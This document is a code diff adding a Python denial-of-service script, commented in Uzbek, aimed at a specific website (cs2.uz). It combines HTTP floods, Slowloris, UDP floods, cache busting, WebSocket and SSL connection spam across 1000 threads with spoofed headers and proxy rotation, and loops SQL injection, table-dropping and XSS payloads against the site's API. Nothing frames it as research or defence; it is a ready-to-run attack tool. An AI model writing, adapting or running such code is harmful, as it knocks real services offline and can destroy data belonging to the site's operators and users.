@@ -581,3 +581,258 @@
 #         asyncio.run(main())
 #     except KeyboardInterrupt:
 #         print("\n[!] Hujum to'xtatildi.")
+
+
+
+
+
+'
+#!/usr/bin/env python3.14
+# -*- coding: utf-8 -*-
+"""
+KESTREL-7 / CS2.UZ_TOTAL_FLOOD
+7 xil hujum usuli: HTTP GET/POST, Slowloris, UDP, Cache Buster, WebSocket, API exploit, SSL renegotiation.
+Proxy rotatsiya, random header, random X-Forwarded-For.
+1000+ parallel oqim.
+"""
+
+import requests
+import threading
+import time
+import random
+import socket
+import ssl
+import urllib3
+import base64
+import os
+from concurrent.futures import ThreadPoolExecutor
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ------------------ KONFIGURATSIYA ------------------
+TARGET = "https://cs2.uz"          # asosiy manzil
+TARGET_HTTP = "http://cs2.uz"      # HTTP variant
+THREADS = 1000                     # jami oqimlar soni
+TIMEOUT = 1.5
+USE_PROXY = False                  # agar proxy list bo'lsa True qiling
+PROXY_LIST = []                    # misol: ['http://user:pass@ip:port', 'socks5://ip:port']
+
+# Agar proxy ishlatilsa, har bir so‘rovga tasodifiy proxy tanlanadi
+PROXIES = [{'http': p, 'https': p} for p in PROXY_LIST] if PROXY_LIST else []
+
+# RANDOM HEADERS
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0",
+]
+
+def random_headers():
+    """Tasodifiy sarlavhalar (X-Forwarded-For qo'shilgan)"""
+    return {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": "*/*",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "keep-alive",
+        "Cache-Control": "no-cache",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+    }
+
+def get_random_proxy():
+    """Proxy ro'yxatidan tasodifiy birini qaytaradi"""
+    return random.choice(PROXIES) if PROXIES else None
+
+# ------------------ 1. HTTP FLOOD (GET/POST/PUT) ------------------
+def http_flood():
+    session = requests.Session()
+    adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50)
+    session.mount('https://', adapter)
+    session.mount('http://', adapter)
+    
+    paths = [
+        "/", "/index.html", "/status", "/api/game/servers", "/api/players/online",
+        "/api/stats", "/api/leaderboard", "/api/store/items", "/api/votes",
+        "/api/ban/list", "/api/admin/status", "/api/payment/check",
+        "/api/player/status", "/api/comment", "/api/login", "/api/register"
+    ]
+    
+    while True:
+        try:
+            path = random.choice(paths)
+            params = {f"p{i}": random.randint(1, 999999) for i in range(5)}
+            proxy = get_random_proxy() if USE_PROXY else None
+            
+            # GET so'rovi
+            session.get(TARGET + path, headers=random_headers(), params=params,
+                        timeout=TIMEOUT, verify=False, proxies=proxy)
+            
+            # POST (20% ehtimol)
+            if random.random() < 0.2:
+                data = {"id": random.randint(1,99999), "action": "vote", "value": random.choice(["up","down"])}
+                session.post(TARGET + "/api/vote", headers=random_headers(), json=data,
+                             timeout=TIMEOUT, verify=False, proxies=proxy)
+            
+            # PUT (10%)
+            if random.random() < 0.1:
+                session.put(TARGET + "/api/player/status", headers=random_headers(),
+                            json={"status": random.choice(["online","offline"]), "player_id": random.randint(1,99999)},
+                            timeout=TIMEOUT, verify=False, proxies=proxy)
+            
+            time.sleep(random.uniform(0.0005, 0.005))
+        except:
+            time.sleep(0.01)
+
+# ------------------ 2. SLOWLORIS (sekin ulanish) ------------------
+def slowloris_bypass():
+    while True:
+        sockets = []
+        try:
+            # Har bir sikl 25 ta ulanish ochib, ularni asta-sekin yuboradi
+            for _ in range(25):
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(3)
+                sock.connect(("cs2.uz", 443))  # HTTPS port
+                sock.send(f"POST /api/comment HTTP/1.1\r\nHost: cs2.uz\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Length: {random.randint(5000, 20000)}\r\n\r\n".encode())
+                sockets.append(sock)
+            # Ulanishlarni bir muddat ochiq ushlab turadi
+            time.sleep(random.uniform(5, 10))
+        except:
+            pass
+        finally:
+            for sock in sockets:
+                try:
+                    sock.close()
+                except:
+                    pass
+        time.sleep(0.01)
+
+# ------------------ 3. UDP FLOOD (agar UDP ochiq bo'lsa) ------------------
+def udp_flood():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(0.1)
+            for _ in range(50):
+                data = b"GET / HTTP/1.1\r\n" + b"X" * 1400
+                for port in [80, 443, 8080]:
+                    sock.sendto(data, ("cs2.uz", port))
+            sock.close()
+        except:
+            pass
+        time.sleep(0.001)
+
+# ------------------ 4. CACHE BUSTER (keshni to'ldirish) ------------------
+def cache_buster():
+    session = requests.Session()
+    while True:
+        try:
+            params = {f"_cb_{i}": random.randint(1, 999999999) for i in range(25)}
+            proxy = get_random_proxy() if USE_PROXY else None
+            session.get(TARGET, params=params, headers=random_headers(),
+                        timeout=TIMEOUT, verify=False, proxies=proxy)
+            # Statik fayllarni ham so'raydi
+            for ext in ["/static/css/main.css", "/static/js/main.js", "/images/logo.png"]:
+                session.get(TARGET + ext, params=params, headers=random_headers(),
+                            timeout=TIMEOUT, verify=False, proxies=proxy)
+            time.sleep(0.001)
+        except:
+            time.sleep(0.01)
+
+# ------------------ 5. WEB SOCKET UPGRADE ------------------
+def ws_upgrade():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            sock.connect(("cs2.uz", 443))
+            key = base64.b64encode(os.urandom(16)).decode()
+            sock.send(f"GET /ws HTTP/1.1\r\nHost: cs2.uz\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n".encode())
+            time.sleep(0.3)
+            sock.close()
+        except:
+            pass
+        time.sleep(0.01)
+
+# ------------------ 6. API EXPLOIT (SQLi, XSS, LFI) ------------------
+def api_exploit():
+    session = requests.Session()
+    payloads = [
+        ("/api/player/status", {"player_id": "1' OR '1'='1' --"}),
+        ("/api/vote", {"server_id": "1; DROP TABLE votes; --"}),
+        ("/api/comment", {"message": "<script>alert('XSS')</script>"}),
+        ("/api/login", {"username": "admin'--", "password": "x"}),
+        ("/api/admin/ban", {"player": "test", "reason": "x" * 5000}),
+        ("/api/register", {"email": "test@test.com", "password": "123", "confirm": "123"})
+    ]
+    while True:
+        try:
+            path, data = random.choice(payloads)
+            proxy = get_random_proxy() if USE_PROXY else None
+            session.post(TARGET + path, json=data, headers=random_headers(),
+                         timeout=TIMEOUT, verify=False, proxies=proxy)
+            session.get(TARGET + path, params=data, headers=random_headers(),
+                        timeout=TIMEOUT, verify=False, proxies=proxy)
+            time.sleep(0.005)
+        except:
+            time.sleep(0.02)
+
+# ------------------ 7. SSL RENEGOTIATION (CPU yuki) ------------------
+def ssl_reneg():
+    while True:
+        try:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            sock = socket.create_connection(("cs2.uz", 443), timeout=3)
+            ssl_sock = context.wrap_socket(sock, server_hostname="cs2.uz")
+            # SSL renegotiation – ba'zi serverlar bunga chidamaydi
+            ssl_sock.do_handshake()
+            ssl_sock.send(b"GET / HTTP/1.1\r\nHost: cs2.uz\r\n\r\n")
+            time.sleep(0.1)
+            ssl_sock.close()
+        except:
+            pass
+        time.sleep(0.01)
+
+# ------------------ ASOSIY ------------------
+def main():
+    print("=" * 70)
+    print("[*] KESTREL-7 : CS2.UZ ga 7 QATLAMLI HUJUM")
+    print(f"[*] Oqimlar: {THREADS}")
+    print("[*] Usullar: HTTP Flood, Slowloris, UDP, Cache Buster, WS, API Exploit, SSL Reneg")
+    if USE_PROXY and PROXIES:
+        print(f"[*] Proxy ro'yxati: {len(PROXIES)} ta proxy ishlatiladi")
+    else:
+        print("[*] Proxy ishlatilmaydi")
+    print("[*] Ctrl+C - to'xtatish")
+    print("=" * 70)
+    
+    methods = [
+        http_flood,
+        slowloris_bypass,
+        udp_flood,
+        cache_buster,
+        ws_upgrade,
+        api_exploit,
+        ssl_reneg
+    ]
+    
+    # ThreadPoolExecutor yordamida barcha usullarni aralashtirib ishga tushiramiz
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        # Har bir oqimga tasodifiy usul beriladi
+        for _ in range(THREADS):
+            executor.submit(random.choice(methods))
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\n[!] Hujum to'xtatildi.")
+            executor.shutdown(wait=False)
+
+if __name__ == "__main__":
+    main()
